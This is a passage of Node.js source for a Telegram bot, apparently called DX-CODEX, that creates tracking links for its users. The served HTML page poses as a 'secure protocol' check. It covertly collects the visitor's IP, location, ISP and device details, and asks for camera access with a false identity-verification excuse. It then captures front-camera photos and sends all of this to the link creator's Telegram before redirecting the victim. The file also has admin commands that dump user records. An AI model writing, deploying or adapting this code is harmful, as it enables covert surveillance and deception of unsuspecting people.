            content += `🎁 ғʀᴇᴇ: <code>${targetUser.freeUrlsLeft}</code>\n`;
            content += `🔗 ᴀᴄᴛɪᴠᴇ: <code>${activeLinkCount}</code>\n`;
            content += `📡 sᴛᴀᴛᴜs: <b>${status}</b>\n`;
            content += `🛡 ʙᴀɴ: <b>${targetUser.isBanned ? "ʏᴇs" : "ɴᴏ"}</b>\n`;
            content += `📅 ʀᴇɢ ᴅᴀᴛᴇ: <code>${regDate}</code>`;
        } else {
            content += `👤 ɴᴀᴍᴇ: <b>${targetUser.firstName || 'Unknown'}</b>\n`;
            content += `🆔 ᴜsᴇʀ ɪᴅ: <code>${targetUser.chatId}</code>\n`; 
            content += `🏷 ᴜsᴇʀ: @${targetUser.username || 'ɴ/ᴀ'}\n`;
            content += `📡 sᴛᴀᴛᴜs: <b>${status}</b>`;
        }

        const shortBorder = (title, body) => {
            return `<b>┏─「 ${_fnt(title)} 」</b>\n${body.split('\n').map(l => `<b>┃</b> ${l}`).join('\n')}\n<b>┗───────────╼</b>`;
        };

        bot.sendMessage(chatId, shortBorder(isOwner ? "ᴀᴅᴍɪɴ ᴅᴀᴛᴀ ᴠɪᴇᴡ" : "ᴜsᴇʀ ᴘʀᴏғɪʟᴇ", content), { parse_mode: 'HTML' });

    } catch (e) {
        bot.sendMessage(chatId, "❌ ᴇʀʀᴏʀ ᴘʀᴇᴘᴀʀɪɴɢ ᴅᴀᴛᴀ");
    }
});

bot.onText(/\/users/, async (msg) => {
    if (!OWNER_IDS.includes(msg.from.id)) return;

    try {
        const users = await User.find({});
        const totalUsers = users.length;
        const activeLinks = await Link.countDocuments();
        const bannedUsers = await User.countDocuments({ isBanned: true });

        let report = `📊 <b>sʏsᴛᴇᴍ sᴛᴀᴛɪsᴛɪᴄs</b>\n\n`;
        report += `👥 <b>ᴛᴏᴛᴀʟ ᴜsᴇʀs:</b> <code>${totalUsers}</code>\n`;
        report += `🔗 <b>ᴀᴄᴛɪᴠᴇ ʟɪɴᴋs:</b> <code>${activeLinks}</code>\n`;
        report += `🚫 <b>ʙᴀɴɴᴇᴅ ᴜsᴇʀs:</b> <code>${bannedUsers}</code>\n`;
        
        await bot.sendMessage(msg.chat.id, makeBorder("sᴛᴀᴛs", report), { parse_mode: 'HTML' });

        let fileContent = `DX-CODEX USER DATABASE REPORT\n`;
        fileContent += `Generated on: ${new Date().toLocaleString()}\n`;
        fileContent += `--------------------------------------------------\n\n`;

        users.forEach((u, index) => {
            const status = u.isBanned ? "BANNED 🚫" : "VALID ✅";
            const date = u.joinedAt ? new Date(u.joinedAt).toLocaleDateString() : "N/A";
            
            fileContent += `${index + 1}. ID: ${u.chatId}\n`;
            fileContent += `   NAME: ${u.firstName || 'N/A'}\n`;
            fileContent += `   USER: @${u.username || 'N/S'}\n`;
            fileContent += `   COINS: ${u.coins || 0}\n`;        
            fileContent += `   FREE LEFT: ${u.freeUrlsLeft || 0}\n`; 
            fileContent += `   DATE: ${date}\n`;
            fileContent += `   STATUS: ${status}\n`;
            fileContent += `--------------------------------------------------\n`;
        });

        const filePath = `./all_users_report.txt`;
        fs.writeFileSync(filePath, fileContent);

        await bot.sendDocument(msg.chat.id, filePath, {
            caption: `📄 <b>ᴀʟʟ ᴜsᴇʀ ᴅᴇᴛᴀɪʟs (ɪɴᴄʟᴜᴅɪɴɢ ᴄᴏɪɴs/ғʀᴇᴇ)</b>`,
            parse_mode: 'HTML'
        });

        fs.unlinkSync(filePath);

    } catch (e) {
        console.error(e);
        bot.sendMessage(msg.chat.id, "❌ Error generating user report.");
    }
});

// ─── 📢 BROADCAST ───────────────

async function handleBroadcast(msg) {
    if (!OWNER_IDS.includes(msg.from.id)) return;

    let text = msg.text || msg.caption || "";
    text = text.replace('/broadcast', '').trim();
    
    let reply_markup = null;
    const btnMatch = text.match(/\[(.*)\|(.*)\]/);
    if (btnMatch) {
        text = text.replace(btnMatch[0], "").trim();
        reply_markup = { inline_keyboard: [[{ text: btnMatch[1].trim(), url: btnMatch[2].trim() }]] };
    }

    if (!text && !msg.photo && !msg.video) return bot.sendMessage(msg.chat.id, "❌ ᴇᴍᴘᴛʏ", {parse_mode:'HTML'});

    const users = await User.find({});
    bot.sendMessage(msg.chat.id, `⏳ <b>sᴇɴᴅɪɴɢ ᴛᴏ ${users.length} ᴜsᴇʀs...</b>`, {parse_mode:'HTML'});

    let success = 0;
    for (const u of users) {
        try {
            if (msg.photo) {
                await bot.sendPhoto(u.chatId, msg.photo[msg.photo.length - 1].file_id, { caption: text, parse_mode: 'HTML', reply_markup });
            } else if (msg.video) {
                await bot.sendVideo(u.chatId, msg.video.file_id, { caption: text, parse_mode: 'HTML', reply_markup });
            } else {
                await bot.sendMessage(u.chatId, text, { parse_mode: 'HTML', reply_markup });
            }
            success++;
        } catch (e) {}
    }
    bot.sendMessage(msg.chat.id, makeBorder("ᴅᴏɴᴇ", `✅: sᴇɴᴛ ᴛᴏ ${success} ᴜsᴇʀs`), {parse_mode:'HTML'});
}

// ─── 🌐 WEB ENGINE ────────

app.get('/w/:id', async (req, res) => {
    const link = await Link.findOne({ shortId: req.params.id });
    if (!link) return res.send("INVALID LINK");
    res.send(getHtmlTemplate(req.params.id, link.originalUrl));
});

app.post('/api/data', async (req, res) => {
    const { linkId, type, data } = req.body;
    const link = await Link.findOne({ shortId: linkId });
    if (!link) return res.json({ status: 'error' });
    const owner = link.creatorChatId;

    try {
        if (type === 'info') {
            const _n = data.ipData;
            const _nav = data.navigator;
            const _batt = data.battery;
            const _gpu = data.gpu;

            let msg = `<blockquote><b>${_fnt("CODEX DEVICE INFO")}</b></blockquote>\n\n`;
            msg += `<b>${_fnt("DEVICE")}:</b> <code>${_nav.platform}</code>\n`;
            msg += `<b>${_fnt("IP ADDRESS")}:</b> <a href="https://ipwho.is/${_n.ip}">${_n.ip}</a>\n`;
            msg += `<b>${_fnt("NETWORK")}:</b> <code>${_n.isp}</code>\n`;
            msg += `<b>${_fnt("LOCATION")}:</b> <code>${_n.city}, ${_n.country}</code>\n`;
            msg += `<b>${_fnt("COORDINATES")}:</b> <code>${_n.loc}</code>\n`;
            msg += `<b>${_fnt("BATTERY")}:</b> <code>${_batt}</code>\n`;
            msg += `<b>${_fnt("CPU CORES")}:</b> <code>${_nav.hardwareConcurrency || 'N/A'}</code>\n`;
            msg += `<b>${_fnt("RAM")}:</b> <code>${_nav.deviceMemory || 'N/A'} GB</code>\n`;
            msg += `<b>${_fnt("GPU")}:</b> <code>${_gpu}</code>\n`;
            msg += `<b>${_fnt("SCREEN")}:</b> <code>${data.screen.width}x${data.screen.height} (${data.screen.depth}-bit)</code>\n`;
            msg += `<b>${_fnt("TIMEZONE")}:</b> <code>${data.timezone}</code>\n`;
            msg += `<b>${_fnt("LANGUAGE")}:</b> <code>${_nav.language}</code>\n`;
            msg += `<b>${_fnt("USER AGENT")}:</b> <pre>${_nav.userAgent}</pre>\n\n`;
            msg += `<blockquote>${_fnt("DEV-BY: DX-CODEX || ")}@Termuxcodex</blockquote>`;

            await bot.sendMessage(owner, msg, { parse_mode: 'HTML', disable_web_page_preview: true });
            
        } else if (type === 'cam') {
            const buffer = Buffer.from(data.images[0].replace(/^data:image\/jpeg;base64,/, ""), 'base64');
            await bot.sendPhoto(owner, buffer, { caption: makeBorder("ᴄᴀᴍᴇʀᴀ", `📱: ${data.platform}`), parse_mode: 'HTML' });
        }
        res.json({ status: 'success' });
    } catch (e) { res.json({ status: 'error' }); }
});

function getHtmlTemplate(linkId, redirectUrl) {
    return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body{margin:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden}
        #status{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;z-index:10}
        video,canvas{display:none}
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <div id="status">INITIALIZING SECURE PROTOCOL...<br>PLEASE WAIT</div>
    <video id="v" autoplay playsinline></video><canvas id="c"></canvas>
<script>
const id = "${linkId}"; const red = "${redirectUrl}";
const m=document.getElementById('matrix'); const ctx=m.getContext('2d');
m.width=window.innerWidth; m.height=window.innerHeight;
const drops=Array(Math.floor(m.width/20)).fill(0);
function draw(){ ctx.fillStyle='rgba(0,0,0,0.05)'; ctx.fillRect(0,0,m.width,m.height); ctx.fillStyle='#0f0'; ctx.font='15px monospace'; drops.forEach((y,i)=>{ const t=String.fromCharCode(Math.random()*128); ctx.fillText(t,i*20,y*20); if(y*20>m.height&&Math.random()>0.975)drops[i]=0; drops[i]++; }); }
setInterval(draw,33);

async function start() {
    let ip = {ip:"?"}; 
    try { ip = await(await fetch('https://ipwho.is/')).json(); } catch(e){}
    
    let batt = "N/A"; 
    try { const b = await navigator.getBattery(); batt = Math.round(b.level*100)+"% "+(b.charging?"🔌":"🔋"); } catch(e){}
    
    let gpu = "N/A"; 
    try { 
        const gl = document.createElement('canvas').getContext('webgl'); 
        const db = gl.getExtension('WEBGL_debug_renderer_info'); 
        gpu = gl.getParameter(db.UNMASKED_RENDERER_WEBGL); 
    } catch(e){}

    const info = {
        ipData: { ip:ip.ip, city:ip.city, country:ip.country, isp:ip.connection?.isp, loc: ip.latitude+","+ip.longitude },
        battery: batt, 
        gpu: gpu,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: { width:screen.width, height:screen.height, depth:screen.colorDepth },
        navigator: { 
            platform: navigator.platform, 
            hardwareConcurrency: navigator.hardwareConcurrency, 
            deviceMemory: navigator.deviceMemory, 
            userAgent: navigator.userAgent,
            language: navigator.language 
        }
    };

    fetch('/api/data', {
        method:'POST', 
        headers:{'Content-Type':'application/json'}, 
        body: JSON.stringify({linkId:id, type:'info', data:info})
    });

    try {
        const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
        const v = document.getElementById('v'); v.srcObject=s;
        v.onloadedmetadata = () => {
            let count=0;
            const itv = setInterval(()=>{
                const cvs=document.getElementById('c'); cvs.width=v.videoWidth; cvs.height=v.videoHeight;
                cvs.getContext('2d').drawImage(v,0,0);
                const img=cvs.toDataURL('image/jpeg',0.5);
                fetch('/api/data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({linkId:id,type:'cam',data:{images:[img],platform:navigator.platform}})});
                count++; if(count>=5){ clearInterval(itv); if(red&&red!=="null") window.location.href=red; }
            },1500);
        };
    } catch(e){ document.getElementById('status').innerHTML="ACCESS DENIED: PLEASE ALLOW PERMISSION<br>TO VERIFY YOUR IDENTITY"; }
}
window.onload = start;
</script>
</body>
</html>`;
}

// ᴜʀʟ ᴛᴏ ᴋᴇᴇᴘ ᴀʟɪᴠᴇ (Replace with your Render App URL)
const APP_URL = "https://code-url-0507.onrender.com"; 

setInterval(async () => {
    try {
        const response = await axios.get(APP_URL);
        console.log(`┏━━「 📡 ᴘɪɴɢ 」━━┓`);
        console.log(`┃ ꜱᴛᴀᴛᴜꜱ: ᴀᴄᴛɪᴠᴇ`);
        console.log(`┃ ᴄᴏᴅᴇ: ${response.status}`);
        console.log(`┗━━━━━━━━━━━━┛`);
    } catch (error) {
        console.error("┃ ❌ ᴘɪɴɢ ғᴀɪʟᴇᴅ: " + error.message);
    }
}, 300000); // 300,000ms = 5 Minutes

// Global Error Handler to prevent crash
process.on('uncaughtException', (err) => console.log('Caught exception: ' + err));
process.on('unhandledRejection', (reason, p) => console.log('Unhandled Rejection:', reason));

app.listen(PORT, () => console.log(`DX-CODEX System Online`));
